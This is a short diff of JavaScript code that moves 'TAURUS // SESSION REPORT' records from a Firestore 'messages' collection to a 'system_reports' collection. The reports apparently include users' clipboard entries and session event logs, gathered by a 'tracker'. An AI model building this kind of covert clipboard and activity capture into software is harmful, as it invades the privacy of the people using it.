@@ -1291,9 +1291,9 @@
         // at the top level for more detailed reports and better exit timing.
 
         try {
-            // Write directly to MESSAGES collection (Only if DB is alive)
+            // Write system telemetry outside the customer inbox.
             if (window.db) {
-                await window.db.collection('messages').add({
+                await window.db.collection('system_reports').add({
                     name: "System Report", // Sender Name
                     email: "tracker@taurus.sys", // System Email
                     message: `TAURUS // SESSION REPORT\n` +
@@ -1306,7 +1306,7 @@
                         `CLIPBOARD\n${clipboardEntries || 'None'}\n\n` +
                         `EVENT LOG\n${eventLog || 'No events recorded'}`,
                     timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                    status: 'new', // Mark as unread
+                    status: 'logged',
                     type: 'report',
                     priority: priority
                 });
